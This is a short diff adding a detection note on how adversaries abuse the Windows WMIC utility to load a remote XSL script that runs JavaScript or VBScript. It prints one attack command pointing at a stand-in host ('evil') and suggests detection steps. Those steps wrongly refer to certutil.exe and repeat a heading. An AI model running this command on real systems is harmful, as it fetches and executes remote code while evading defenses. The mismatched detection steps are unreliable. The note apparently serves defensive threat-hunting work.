@@ -1,0 +1,15 @@
+
+WMIC shell is a windows utility that provide command line interface for WMI(Windows Management Instrumentation).This offers
+various administrative functions to query windows machines to get details like System settings , process etc and also to execute scripts.
+Adversaries use this utility to download malicious payload to evade detections.
+
+Command:
+wmic os get /FORMAT:"http://evil/evil[.]xsl"
+XSL script (eXtensible Stylesheet Language). WMI can invoke javascript or VBscript using XSL
+
+Detection:
+Detection:
+1.WMI for certutil.exe prefetch files and Parsing the prefetch will provide the downloaded file. 
+2.Command execution and arguments passed to certutil.exe using EDR solutions.
+3.Look for Windows event id 4688 and search this utility names as a keyword alond with below syntax 
+"wmic os get /FORMAT:"http:/"
